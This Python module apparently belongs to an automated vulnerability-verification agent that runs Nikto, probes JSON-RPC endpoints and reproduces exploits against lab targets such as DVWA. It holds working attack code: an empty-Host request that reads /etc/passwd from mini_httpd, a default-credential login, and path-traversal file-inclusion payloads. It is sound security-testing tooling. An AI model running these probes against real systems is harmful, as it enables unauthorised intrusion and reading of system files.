from __future__ import annotations

import json
import re
import socket
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from urllib.parse import quote, urljoin, urlparse

import requests

from app.schemas.tool import ToolExecutionResult, VulnerabilityVerifyInput
from app.tools.base import ToolContext, ToolExecutionError, run_command


PASSWD_MARKER_RE = re.compile(r"^root:.*:0:0:", re.MULTILINE)
LOGIN_FORM_RE = re.compile(r"<form[^>]+action=[\"']login\.php[\"']", re.IGNORECASE)
USER_TOKEN_RE = re.compile(
    r"name=[\"']user_token[\"'][^>]*value=[\"']([^\"']+)[\"']",
    re.IGNORECASE,
)
DVWA_FI_MARKERS = [
    "1.) Bond. James Bond",
    "2.) My name is Sherlock Holmes.",
    "The pool on the roof must have a leak.",
]
JSON_RPC_COMMON_PATHS = ["/jsonrpc", "/rpc", "/api/jsonrpc"]


@dataclass(slots=True)
class ScannerRun:
    name: str
    success: bool
    summary: str
    data: dict[str, Any]


@dataclass(slots=True)
class PocRun:
    success: bool
    attempted: bool
    summary: str
    poc: dict[str, Any]
    evidence: dict[str, Any]
    artifact_paths: list[str]


def execute(params: VulnerabilityVerifyInput, context: ToolContext) -> ToolExecutionResult:
    url = f"{params.scheme}://{params.target}:{params.port}"
    profile = _select_profile(params)
    scanner_runs: list[ScannerRun] = []
    evidence: list[dict[str, Any]] = []
    findings: list[dict[str, str]] = []
    pocs: list[dict[str, Any]] = []
    verification_status = "inconclusive"
    extra_artifact_paths: list[str] = []
    nikto_run: ScannerRun | None = None

    if profile == "json_rpc":
        rpc_run = _run_json_rpc_probe(params, context.artifact_dir)
        scanner_runs.append(rpc_run)
        evidence.append(
            {
                "kind": "json_rpc_probe",
                "target": params.target,
                "port": params.port,
                "summary": rpc_run.summary,
                "data": rpc_run.data,
            }
        )
        findings.extend(rpc_run.data.get("findings", []))
        pocs.extend(rpc_run.data.get("pocs", []))
        if rpc_run.data.get("unauthenticated_method_call"):
            verification_status = "confirmed"
        elif rpc_run.success:
            verification_status = "profiled"
    else:
        nikto_run = _run_nikto(url, profile, params.timeout, context.artifact_dir)
        scanner_runs.append(nikto_run)
        evidence.append(
            {
                "kind": "nikto",
                "target": params.target,
                "port": params.port,
                "summary": nikto_run.summary,
                "data": nikto_run.data,
            }
        )
        findings.extend(_findings_from_nikto(nikto_run.data.get("issues", [])))

    if profile == "mini_httpd":
        probe_run = _run_mini_httpd_probe(params.target, params.port, context.artifact_dir)
        scanner_runs.append(probe_run)
        evidence.append(
            {
                "kind": "mini_httpd_probe",
                "target": params.target,
                "port": params.port,
                "summary": probe_run.summary,
                "data": probe_run.data,
            }
        )
        if probe_run.data.get("passwd_leaked"):
            verification_status = "confirmed"
            findings.append(
                {
                    "title": "mini_httpd arbitrary file read reproduced with empty Host header request",
                    "severity": "high",
                    "confidence": "confirmed",
                    "evidence_summary": "A raw HTTP request with an empty Host header returned /etc/passwd content.",
                }
            )
        elif nikto_run.success or probe_run.success:
            verification_status = "not_reproduced"
    elif profile != "json_rpc":
        dvwa_signals = _collect_php_apache_signals(params)
        if dvwa_signals:
            evidence.append(
                {
                    "kind": "profile_signal",
                    "target": params.target,
                    "port": params.port,
                    "summary": f"PHP/Apache profile matched signals: {', '.join(dvwa_signals)}",
                    "data": {"signals": dvwa_signals},
                }
            )
        if _should_run_dvwa_fi_poc(params, profile, dvwa_signals):
            poc_run = _run_dvwa_fi_poc(url, context.artifact_dir)
            extra_artifact_paths.extend(poc_run.artifact_paths)
            evidence.append(
                {
                    "kind": "dvwa_fi_poc",
                    "target": params.target,
                    "port": params.port,
                    "summary": poc_run.summary,
                    "data": poc_run.evidence,
                }
            )
            pocs.append(poc_run.poc)
            if poc_run.success:
                verification_status = "confirmed"
                findings.append(
                    {
                        "title": "DVWA File Inclusion low-level PoC reproduced",
                        "severity": "high",
                        "confidence": "confirmed",
                        "evidence_summary": "A controlled file inclusion request returned the expected DVWA flag content.",
                    }
                )
            elif poc_run.attempted:
                verification_status = "not_reproduced"
        if (nikto_run and nikto_run.success) or dvwa_signals:
            verification_status = (
                verification_status if verification_status != "inconclusive" else "profiled"
            )

    if not any(run.success for run in scanner_runs) and verification_status == "inconclusive":
        verification_status = "inconclusive"

    summary = _build_summary(url, profile, verification_status, scanner_runs, findings, pocs)
    artifact_path = context.artifact_dir / "vuln_verify.json"
    artifact_path.write_text(
        json.dumps(
            {
                "url": url,
                "profile": profile,
                "verification_status": verification_status,
                "scanner_runs": [_scanner_run_to_dict(run) for run in scanner_runs],
                "findings": findings,
                "evidence": evidence,
                "pocs": pocs,
            },
            indent=2,
        ),
        encoding="utf-8",
    )

    return ToolExecutionResult(
        tool_name="vuln_verify",
        success=True,
        summary=summary,
        raw_output="\n\n".join(
            f"[{run.name}] {run.summary}\n{run.data.get('raw', '')}".strip()
            for run in scanner_runs
            if run.summary or run.data.get("raw")
        ).strip(),
        structured_data={
            "url": url,
            "profile": profile,
            "verification_status": verification_status,
            "issues": nikto_run.data.get("issues", []) if nikto_run else [],
            "findings": findings,
            "evidence": evidence,
            "pocs": pocs,
            "scanner_runs": [_scanner_run_to_dict(run) for run in scanner_runs],
        },
        artifact_paths=[str(artifact_path), *extra_artifact_paths],
    )


def _select_profile(params: VulnerabilityVerifyInput) -> str:
    if params.profile != "auto":
        return params.profile

    service_text = " ".join(
        [
            params.service_name,
            params.service_product,
            params.service_version,
            params.lab_description,
            params.page_title,
        ]
    ).lower()
    header_text = " ".join(f"{key}:{value}" for key, value in params.headers.items()).lower()
    path_text = " ".join(params.interesting_paths).lower()

    if "mini_httpd" in service_text:
        return "mini_httpd"
    if any(marker in service_text for marker in ["aria2", "json-rpc", "json rpc", "xml-rpc"]):
        return "json_rpc"
    if any(path in path_text for path in JSON_RPC_COMMON_PATHS):
        return "json_rpc"
    if "dvwa" in service_text:
        return "php_apache"
    if "apache" in service_text and "php" in header_text:
        return "php_apache"
    if "phpinfo" in path_text or "login.php" in path_text or "setup.php" in path_text:
        return "php_apache"
    return "generic_web"


def _run_nikto(url: str, profile: str, timeout: int, artifact_dir: Path) -> ScannerRun:
    tuning = "b,e" if profile == "php_apache" else "b"
    maxtime = min(timeout, 20 if profile in {"php_apache", "mini_httpd"} else 30)
    args = [
        "nikto",
        "-nointeractive",
        "-ask",
        "no",
        "-nocheck",
        "-host",
        url,
        "-maxtime",
        f"{maxtime}s",
        "-timeout",
        "5",
        "-Tuning",
        tuning,
    ]
    try:
        stdout, stderr, return_code = run_command(
            args,
            timeout=maxtime + 20,
            max_output_chars=20000,
        )
    except ToolExecutionError as exc:
        return ScannerRun(
            name="nikto",
            success=False,
            summary=f"Nikto did not complete cleanly: {exc}",
            data={"issues": [], "raw": str(exc), "return_code": None},
        )

    issues: list[dict[str, str]] = []
    for line in stdout.splitlines():
        stripped = line.strip()
        if not stripped.startswith("+ "):
            continue
        if any(
            marker in stripped
            for marker in [
                "Nikto v",
                "Target IP",
                "Target Hostname",
                "Target Port",
                "Start Time",
                "End Time",
                "Platform:",
                "Server:",
                "No CGI Directories found",
                "requests:",
                "host(s) tested",
                "Scan terminated:",
            ]
        ):
            continue
        issues.append({"detail": stripped[2:]})

    raw_path = artifact_dir / "nikto_profile.txt"
    raw_path.write_text(stdout, encoding="utf-8")

    success = return_code in {0, 1}
    if "Host maximum execution time" in stdout and issues:
        success = True

    summary = (
        f"Nikto {profile} profile collected {len(issues)} observation(s)."
        if success
        else (stderr or stdout or "Nikto verification failed.")
    )
    return ScannerRun(
        name="nikto",
        success=success,
        summary=summary,
        data={
            "issues": issues,
            "raw": stdout,
            "stderr": stderr,
            "return_code": return_code,
            "tuning": tuning,
            "maxtime_seconds": maxtime,
            "artifact_path": str(raw_path),
        },
    )


def _run_mini_httpd_probe(target: str, port: int, artifact_dir: Path) -> ScannerRun:
    request = (
        "GET /etc/passwd HTTP/1.1\r\n"
        "Host: \r\n"
        "User-Agent: profile-verifier\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    try:
        response = _send_raw_http_request(target, port, request)
    except OSError as exc:
        return ScannerRun(
            name="mini_httpd_empty_host_probe",
            success=False,
            summary=f"Raw mini_httpd probe failed: {exc}",
            data={"raw": str(exc), "status_code": 0, "passwd_leaked": False},
        )

    status_code, headers, body = _split_http_response(response)
    leaked = bool(PASSWD_MARKER_RE.search(body))
    probe_path = artifact_dir / "mini_httpd_probe.txt"
    probe_path.write_text(response, encoding="utf-8")

    if leaked:
        summary = "Raw empty-Host probe returned /etc/passwd markers."
    else:
        summary = (
            f"Raw empty-Host probe returned HTTP {status_code}; mini_httpd vulnerability preconditions likely unmet."
        )

    return ScannerRun(
        name="mini_httpd_empty_host_probe",
        success=True,
        summary=summary,
        data={
            "status_code": status_code,
            "headers": headers,
            "body_preview": body[:400],
            "passwd_leaked": leaked,
            "raw": response[:2000],
            "artifact_path": str(probe_path),
        },
    )


def _run_json_rpc_probe(params: VulnerabilityVerifyInput, artifact_dir: Path) -> ScannerRun:
    service_text = " ".join(
        [
            params.service_name,
            params.service_product,
            params.service_version,
            params.lab_description,
            params.page_title,
        ]
    ).lower()
    candidate_paths = _json_rpc_candidate_paths(params, service_text)
    probe_methods = _json_rpc_probe_methods(service_text)
    transcripts: list[dict[str, Any]] = []
    findings: list[dict[str, str]] = []
    pocs: list[dict[str, Any]] = []
    unauthenticated_method_call = False
    endpoint_profiled = False

    for path in candidate_paths:
        endpoint_url = f"{params.scheme}://{params.target}:{params.port}{path}"
        for method_name, payload in probe_methods:
            request_body = json.dumps(payload, separators=(",", ":"))
            try:
                response = requests.post(
                    endpoint_url,
                    headers={"Content-Type": "application/json"},
                    data=request_body,
                    timeout=min(params.timeout, 15),
                    allow_redirects=False,
                    verify=False,
                )
            except requests.RequestException as exc:
                transcripts.append(
                    {
                        "path": path,
                        "method": method_name,
                        "request_body": request_body,
                        "error": str(exc),
                        "status_code": 0,
                    }
                )
                continue

            body_text = response.text[:2000]
            parsed_body: dict[str, Any] | None = None
            try:
                parsed_body = response.json()
            except ValueError:
                parsed_body = None

            transcripts.append(
                {
                    "path": path,
                    "method": method_name,
                    "request_body": request_body,
                    "status_code": response.status_code,
                    "headers": {str(key): str(value) for key, value in response.headers.items()},
                    "body_preview": body_text[:400],
                    "json": parsed_body,
                }
            )

            if response.status_code == 200 and isinstance(parsed_body, dict):
                endpoint_profiled = True
                if "result" in parsed_body:
                    unauthenticated_method_call = True
                    findings.append(
                        {
                            "title": f"Unauthenticated JSON-RPC method call succeeded on {path}",
                            "severity": "high",
                            "confidence": "confirmed",
                            "evidence_summary": f"Safe method `{method_name}` returned a JSON-RPC result without authentication.",
                        }
                    )
                    pocs.append(
                        {
                            "id": f"json-rpc-{method_name.lower().replace('.', '-')}",
                            "title": f"Unauthenticated JSON-RPC capability probe via {method_name}",
                            "module": "json_rpc",
                            "status": "confirmed",
                            "method": "POST",
                            "url": endpoint_url,
                            "path": path,
                            "params": payload,
                            "request_excerpt": (
                                f"POST {path} HTTP/1.1\n"
                                "Content-Type: application/json\n\n"
                                f"{request_body}"
                            ),
                            "response_excerpt": body_text[:400],
                            "success_evidence": [json.dumps(parsed_body, ensure_ascii=False)[:200]],
                            "notes": [
                                "This is a safe capability probe proving unauthenticated JSON-RPC access.",
                            ],
                            "evidence_files": [],
                        }
                    )
                    break

                error_text = json.dumps(parsed_body.get("error", {}), ensure_ascii=False).lower()
                if "auth" not in error_text and "forbidden" not in error_text and "permission" not in error_text:
                    endpoint_profiled = True

        if unauthenticated_method_call:
            break

    artifact_path = artifact_dir / "json_rpc_probe.json"
    artifact_path.write_text(
        json.dumps(
            {
                "paths": candidate_paths,
                "probe_methods": [name for name, _ in probe_methods],
                "unauthenticated_method_call": unauthenticated_method_call,
                "endpoint_profiled": endpoint_profiled,
                "findings": findings,
                "pocs": pocs,
                "transcripts": transcripts,
            },
            indent=2,
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )

    if unauthenticated_method_call:
        summary = "Safe JSON-RPC probing reproduced unauthenticated method access."
    elif endpoint_profiled:
        summary = "JSON-RPC endpoint accepted structured requests, but no safe method returned a result."
    else:
        summary = "JSON-RPC probing was inconclusive."

    return ScannerRun(
        name="json_rpc_probe",
        success=unauthenticated_method_call or endpoint_profiled,
        summary=summary,
        data={
            "paths": candidate_paths,
            "probe_methods": [name for name, _ in probe_methods],
            "unauthenticated_method_call": unauthenticated_method_call,
            "endpoint_profiled": endpoint_profiled,
            "findings": findings,
            "pocs": pocs,
            "transcripts": transcripts,
            "artifact_path": str(artifact_path),
        },
    )


def _json_rpc_candidate_paths(
    params: VulnerabilityVerifyInput,
    service_text: str,
) -> list[str]:
    paths: list[str] = []
    for path in params.interesting_paths:
        if path in JSON_RPC_COMMON_PATHS and path not in paths:
            paths.append(path)
    if "aria2" in service_text and "/jsonrpc" not in paths:
        paths.insert(0, "/jsonrpc")
    for path in JSON_RPC_COMMON_PATHS:
        if path not in paths:
            paths.append(path)
    return paths


def _json_rpc_probe_methods(service_text: str) -> list[tuple[str, dict[str, Any]]]:
    methods: list[tuple[str, dict[str, Any]]] = []
    if "aria2" in service_text:
        methods.append(
            (
                "aria2.getVersion",
                {"jsonrpc": "2.0", "id": 1, "method": "aria2.getVersion", "params": []},
            )
        )
    methods.extend(
        [
            (
                "rpc.discover",
                {"jsonrpc": "2.0", "id": 1, "method": "rpc.discover", "params": []},
            ),
            (
                "system.listMethods",
                {"jsonrpc": "2.0", "id": 1, "method": "system.listMethods", "params": []},
            ),
            (
                "system.describe",
                {"jsonrpc": "2.0", "id": 1, "method": "system.describe", "params": []},
            ),
        ]
    )
    dedup: list[tuple[str, dict[str, Any]]] = []
    seen: set[str] = set()
    for name, payload in methods:
        if name in seen:
            continue
        dedup.append((name, payload))
        seen.add(name)
    return dedup


def _send_raw_http_request(target: str, port: int, request: str) -> str:
    with socket.create_connection((target, port), timeout=5) as sock:
        sock.settimeout(5)
        sock.sendall(request.encode("latin1"))
        chunks: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks).decode("latin1", errors="replace")


def _split_http_response(response: str) -> tuple[int, dict[str, str], str]:
    head, _, body = response.partition("\r\n\r\n")
    lines = head.splitlines()
    status_code = 0
    if lines:
        parts = lines[0].split()
        if len(parts) >= 2 and parts[1].isdigit():
            status_code = int(parts[1])

    headers: dict[str, str] = {}
    for line in lines[1:]:
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        headers[key.strip()] = value.strip()
    return status_code, headers, body


def _findings_from_nikto(issues: list[dict[str, str]]) -> list[dict[str, str]]:
    findings: list[dict[str, str]] = []
    for issue in issues:
        detail = issue["detail"]
        lowered = detail.lower()
        if "suggested security header missing" in lowered:
            findings.append(
                {
                    "title": detail,
                    "severity": "low",
                    "confidence": "suspected",
                    "evidence_summary": "Nikto reported a missing defensive header in the HTTP response.",
                }
            )
        elif "login page/section found" in lowered:
            findings.append(
                {
                    "title": detail,
                    "severity": "low",
                    "confidence": "suspected",
                    "evidence_summary": "Nikto identified an exposed login surface worth keeping in evidence.",
                }
            )
        elif "appears to be outdated" in lowered:
            findings.append(
                {
                    "title": detail,
                    "severity": "medium",
                    "confidence": "suspected",
                    "evidence_summary": "Nikto matched the server banner to an outdated software signature.",
                }
            )
    return findings


def _collect_php_apache_signals(params: VulnerabilityVerifyInput) -> list[str]:
    signals: list[str] = []
    if "dvwa" in params.page_title.lower():
        signals.append("dvwa_title")
    if "x-powered-by" in {key.lower() for key in params.headers}:
        header_value = " ".join(params.headers.values()).lower()
        if "php" in header_value:
            signals.append("php_header")
    lowered_paths = {path.lower() for path in params.interesting_paths}
    for path in ["/login.php", "/setup.php", "/phpinfo.php"]:
        if path in lowered_paths:
            signals.append(path.lstrip("/"))
    return signals


def _should_run_dvwa_fi_poc(
    params: VulnerabilityVerifyInput,
    profile: str,
    dvwa_signals: list[str],
) -> bool:
    if params.preferred_poc == "none":
        return False
    if params.preferred_poc == "dvwa_fi":
        return True
    if profile != "php_apache":
        return False

    lowered_paths = {path.lower() for path in params.interesting_paths}
    lowered_text = " ".join(
        [params.lab_description, params.page_title, params.service_product, params.service_name]
    ).lower()
    return (
        "dvwa" in lowered_text
        or "dvwa_title" in dvwa_signals
        or any(path.startswith("/vulnerabilities/fi") for path in lowered_paths)
    )


def _run_dvwa_fi_poc(base_url: str, artifact_dir: Path) -> PocRun:
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": "vulntrace-agent-dvwa-fi/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
    )
    session.cookies.set("security", "low", path="/")

    fi_path = "/vulnerabilities/fi/"
    fi_url = urljoin(base_url.rstrip("/") + "/", fi_path.lstrip("/"))
    auth_note = "Authentication was not required."

    try:
        probe = session.get(fi_url, timeout=5, allow_redirects=True)
    except requests.RequestException as exc:
        return PocRun(
            success=False,
            attempted=False,
            summary=f"DVWA FI PoC could not reach the target: {exc}",
            poc=_build_failed_dvwa_fi_poc(
                base_url=base_url,
                path=fi_path,
                auth_note="Target was unreachable during the PoC probe.",
                last_request="",
                last_response=str(exc),
                attempted_payloads=[],
            ),
            evidence={
                "status": "unreachable",
                "auth_note": "Target was unreachable during the PoC probe.",
                "attempted_payloads": [],
                "error": str(exc),
            },
            artifact_paths=[],
        )

    if _looks_like_login_page(probe):
        login_result = _login_to_dvwa(session, base_url)
        auth_note = login_result["summary"]
        if not login_result["success"]:
            return PocRun(
                success=False,
                attempted=False,
                summary=f"DVWA FI PoC stopped before exploitation: {auth_note}",
                poc=_build_failed_dvwa_fi_poc(
                    base_url=base_url,
                    path=fi_path,
                    auth_note=auth_note,
                    last_request="",
                    last_response=login_result.get("response_excerpt", ""),
                    attempted_payloads=[],
                ),
                evidence={
                    "status": "login_failed",
                    "auth_note": auth_note,
                    "attempted_payloads": [],
                    "response_excerpt": login_result.get("response_excerpt", ""),
                },
                artifact_paths=[],
            )

    attempts = [
        {
            "name": "app_flag_file",
            "payload": "../../hackable/flags/fi.php",
            "markers": DVWA_FI_MARKERS,
            "description": "Include DVWA's own flag file to avoid reading host-sensitive files.",
        },
        {
            "name": "etc_passwd_fallback",
            "payload": "../../../../../../etc/passwd",
            "markers": ["root:"],
            "description": "Fallback traversal target when the in-app flag file does not produce output.",
        },
    ]
    attempted_payloads: list[dict[str, Any]] = []
    artifact_paths: list[str] = []
    last_request = ""
    last_response_excerpt = ""

    for attempt in attempts:
        request_preview = _build_dvwa_request_preview(
            fi_path,
            attempt["payload"],
            base_url,
            session.cookies,
        )
        last_request = request_preview
        try:
            response = session.get(
                fi_url,
                params={"page": attempt["payload"]},
                timeout=5,
                allow_redirects=True,
            )
        except requests.RequestException as exc:
            last_response_excerpt = str(exc)
            attempted_payloads.append(
                {
                    "payload": attempt["payload"],
                    "status": "request_error",
                    "detail": str(exc),
                }
            )
            continue

        response_excerpt = _extract_response_excerpt(response.text, attempt["markers"])
        last_response_excerpt = response_excerpt
        request_path = artifact_dir / f"dvwa_fi_{attempt['name']}_request.txt"
        response_path = artifact_dir / f"dvwa_fi_{attempt['name']}_response.html"
        request_path.write_text(request_preview, encoding="utf-8")
        response_path.write_text(response.text, encoding="utf-8")
        artifact_paths.extend([str(request_path), str(response_path)])

        matched_markers = _find_markers(response.text, attempt["markers"])
        success = bool(matched_markers)
        if attempt["name"] == "etc_passwd_fallback" and PASSWD_MARKER_RE.search(response.text):
            success = True
            if "root:" not in matched_markers:
                matched_markers.append("root:")

        attempted_payloads.append(
            {
                "payload": attempt["payload"],
                "status": "confirmed" if success else "no_match",
                "response_url": response.url,
                "status_code": response.status_code,
                "markers": matched_markers,
                "description": attempt["description"],
                "request_artifact": str(request_path),
                "response_artifact": str(response_path),
            }
        )

        if success:
            poc = {
                "id": "dvwa-fi-low",
                "title": "DVWA File Inclusion low-level PoC",
                "module": "file_inclusion",
                "status": "confirmed",
                "method": "GET",
                "url": response.url,
                "path": fi_path,
                "params": {"page": attempt["payload"]},
                "request_excerpt": request_preview,
                "response_excerpt": response_excerpt,
                "success_evidence": matched_markers,
                "notes": [
                    auth_note,
                    "The PoC forces the DVWA security cookie to low and issues a single bounded include request.",
                    attempt["description"],
                ],
                "evidence_files": [str(request_path), str(response_path)],
            }
            return PocRun(
                success=True,
                attempted=True,
                summary=(
                    "DVWA FI PoC reproduced successfully; the controlled include returned the expected markers."
                ),
                poc=poc,
                evidence={
                    "status": "confirmed",
                    "auth_note": auth_note,
                    "attempted_payloads": attempted_payloads,
                    "matched_markers": matched_markers,
                    "response_url": response.url,
                    "status_code": response.status_code,
                },
                artifact_paths=artifact_paths,
            )

    return PocRun(
        success=False,
        attempted=bool(attempted_payloads),
        summary="DVWA FI PoC was attempted, but the expected include markers were not observed.",
        poc=_build_failed_dvwa_fi_poc(
            base_url=base_url,
            path=fi_path,
            auth_note=auth_note,
            last_request=last_request,
            last_response=last_response_excerpt,
            attempted_payloads=attempted_payloads,
        ),
        evidence={
            "status": "not_reproduced",
            "auth_note": auth_note,
            "attempted_payloads": attempted_payloads,
            "last_response_excerpt": last_response_excerpt,
        },
        artifact_paths=artifact_paths,
    )


def _login_to_dvwa(session: requests.Session, base_url: str) -> dict[str, Any]:
    login_url = urljoin(base_url.rstrip("/") + "/", "login.php")
    try:
        login_page = session.get(login_url, timeout=5, allow_redirects=True)
    except requests.RequestException as exc:
        return {
            "success": False,
            "summary": f"Could not load DVWA login page: {exc}",
            "response_excerpt": str(exc),
        }

    token = _extract_user_token(login_page.text)
    if not token:
        return {
            "success": False,
            "summary": "Could not extract DVWA login CSRF token from login.php.",
            "response_excerpt": _extract_response_excerpt(login_page.text, ["user_token"]),
        }

    try:
        response = session.post(
            login_url,
            data={
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": token,
            },
            timeout=5,
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        return {
            "success": False,
            "summary": f"DVWA login request failed: {exc}",
            "response_excerpt": str(exc),
        }

    success = not _looks_like_login_page(response) and "Login failed" not in response.text
    return {
        "success": success,
        "summary": (
            "Logged into DVWA with the default lab credentials admin/password."
            if success
            else "DVWA required authentication and the default admin/password login did not succeed."
        ),
        "response_excerpt": _extract_response_excerpt(
            response.text,
            ["Welcome to Damn Vulnerable Web Application", "Login failed"],
        ),
    }


def _extract_user_token(content: str) -> str | None:
    match = USER_TOKEN_RE.search(content)
    return match.group(1) if match else None


def _looks_like_login_page(response: requests.Response) -> bool:
    lowered_url = response.url.lower()
    if lowered_url.endswith("/login.php") or "login.php" in lowered_url:
        return True
    return bool(LOGIN_FORM_RE.search(response.text))


def _build_dvwa_request_preview(
    path: str,
    payload: str,
    base_url: str,
    cookies: requests.cookies.RequestsCookieJar,
) -> str:
    cookie_parts = []
    for key, value in cookies.items():
        if key.lower() == "phpsessid":
            cookie_parts.append(f"{key}=<redacted>")
        else:
            cookie_parts.append(f"{key}={value}")
    request_target = f"{path}?page={quote(payload, safe='')}"
    host = urlparse(base_url).netloc or "<authorized-target>"
    lines = [
        f"GET {request_target} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: vulntrace-agent-dvwa-fi/1.0",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ]
    if cookie_parts:
        lines.append(f"Cookie: {'; '.join(cookie_parts)}")
    return "\n".join(lines)


def _find_markers(content: str, markers: list[str]) -> list[str]:
    return [marker for marker in markers if marker in content]


def _extract_response_excerpt(content: str, markers: list[str]) -> str:
    normalized = content.replace("\r", "")
    for marker in markers:
        index = normalized.find(marker)
        if index >= 0:
            start = max(0, index - 180)
            end = min(len(normalized), index + max(len(marker), 180))
            return normalized[start:end].strip()
    return normalized[:480].strip()


def _build_failed_dvwa_fi_poc(
    *,
    base_url: str,
    path: str,
    auth_note: str,
    last_request: str,
    last_response: str,
    attempted_payloads: list[dict[str, Any]],
) -> dict[str, Any]:
    return {
        "id": "dvwa-fi-low",
        "title": "DVWA File Inclusion low-level PoC",
        "module": "file_inclusion",
        "status": "not_reproduced",
        "method": "GET",
        "url": urljoin(base_url.rstrip("/") + "/", path.lstrip("/")),
        "path": path,
        "params": {},
        "request_excerpt": last_request,
        "response_excerpt": last_response,
        "success_evidence": [],
        "notes": [auth_note],
        "attempted_payloads": attempted_payloads,
        "evidence_files": [
            payload["request_artifact"]
            for payload in attempted_payloads
            if "request_artifact" in payload
        ]
        + [
            payload["response_artifact"]
            for payload in attempted_payloads
            if "response_artifact" in payload
        ],
    }


def _build_summary(
    url: str,
    profile: str,
    verification_status: str,
    scanner_runs: list[ScannerRun],
    findings: list[dict[str, str]],
    pocs: list[dict[str, Any]],
) -> str:
    successful_scanners = [run.name for run in scanner_runs if run.success]
    confirmed_poc = next((item for item in pocs if item.get("status") == "confirmed"), None)
    if verification_status == "confirmed":
        if confirmed_poc:
            return (
                f"Profile {profile} reproduced a confirmed condition against {url}; "
                f"PoC `{confirmed_poc.get('id', 'unknown')}` returned the expected evidence markers."
            )
        return (
            f"Profile {profile} reproduced a confirmed condition against {url} using "
            f"{', '.join(successful_scanners) or 'the available checks'}."
        )
    if verification_status == "not_reproduced":
        return (
            f"Profile {profile} ran against {url}, but the targeted condition was not reproduced."
        )
    if verification_status == "profiled":
        return (
            f"Profile {profile} completed against {url} with {len(findings)} structured observation(s)."
        )
    return f"Profile {profile} produced an inconclusive verification result against {url}."


def _scanner_run_to_dict(run: ScannerRun) -> dict[str, Any]:
    return {
        "name": run.name,
        "success": run.success,
        "summary": run.summary,
        "data": run.data,
    }
